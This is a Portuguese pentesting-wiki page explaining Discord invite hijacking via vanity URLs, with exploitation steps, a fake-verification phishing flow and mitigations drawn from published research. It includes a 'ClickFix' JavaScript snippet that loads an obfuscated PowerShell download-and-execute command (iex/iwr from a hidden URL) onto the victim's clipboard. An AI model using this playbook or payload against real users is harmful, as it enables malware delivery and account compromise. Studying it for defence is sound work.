# Sequestro de Convites do Discord

{{#include ../../banners/hacktricks-training.md}}

A vulnerabilidade do sistema de convites do Discord permite que threat actors reivindiquem códigos de convite expirados ou excluídos (temporários, permanentes ou custom vanity) como novos vanity links em qualquer servidor com Level 3 Boost. Ao normalizar todos os códigos para letras minúsculas, os attackers podem pré-registrar códigos de convite conhecidos e sequestrar o tráfego silenciosamente quando o link original expirar ou o servidor de origem perder o boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipos de Convite e Risco de Sequestro

| Tipo de Convite           | Pode ser sequestrado? | Condição / Comentários                                                                                   |
|---------------------------|------------------------|----------------------------------------------------------------------------------------------------------|
| Link de Convite Temporário | ✅                    | Após a expiração, o código fica disponível e pode ser registrado novamente como vanity URL por um servidor com boost. |
| Link de Convite Permanente | ⚠️                   | Se for excluído e consistir apenas em letras minúsculas e dígitos, o código poderá ficar disponível novamente. |
| Custom Vanity Link         | ✅                    | Se o servidor original perder seu Level 3 Boost, seu vanity invite ficará disponível para novo registro.    |

## Etapas de Exploitation

1. Reconnaissance
- Monitore fontes públicas (fóruns, redes sociais, canais do Telegram) em busca de links de convite correspondentes ao padrão `discord.gg/{code}` ou `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Colete códigos de convite de interesse (temporários ou vanity).
2. Pré-registro
- Crie ou use um servidor Discord existente com privilégios de Level 3 Boost.
- Em **Server Settings → Vanity URL**, tente atribuir o código de convite alvo. Se aceito, o código será reservado pelo servidor malicioso.
3. Ativação do Sequestro
- Para convites temporários, aguarde até que o convite original expire (ou exclua-o manualmente se você controlar a origem).
- Para códigos que contêm letras maiúsculas, a variante em letras minúsculas pode ser reivindicada imediatamente, embora o redirecionamento só seja ativado após a expiração.
4. Redirecionamento Silencioso
- Os usuários que acessarem o link antigo serão enviados perfeitamente ao servidor controlado pelo attacker assim que o sequestro estiver ativo.

## Phishing Flow via Discord Server

1. Restrinja os canais do servidor para que apenas um canal **#verify** fique visível.<sup>[[1]](#references)</sup>
2. Implante um bot (por exemplo, **Safeguard#0786**) para solicitar que os novos usuários façam a verificação via OAuth2.
3. O bot redireciona os usuários para um site de phishing (por exemplo, `captchaguard.me`) sob o pretexto de uma CAPTCHA ou etapa de verificação.
4. Implemente o truque de UX do **ClickFix**:
- Exiba uma mensagem de CAPTCHA quebrada.
- Oriente os usuários a abrir a caixa de diálogo **Win+R**, colar um comando PowerShell pré-carregado e pressionar Enter.

### Exemplo de Injeção de Clipboard via ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Essa abordagem evita downloads diretos de arquivos e utiliza elementos familiares da UI para reduzir a suspeita do usuário.<sup>[[1]](#references)</sup>

## Mitigações

- Use links de convite permanentes contendo pelo menos uma letra maiúscula ou um caractere não alfanumérico (nunca expiram, não reutilizáveis).<sup>[[1]](#references)</sup>
- Faça a rotação regular dos códigos de convite e revogue os links antigos.
- Monitore o status de boost do servidor do Discord e as reivindicações de vanity URLs.
- Oriente os usuários a verificar a autenticidade do servidor e evitar executar comandos colados da área de transferência.

## Referências

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
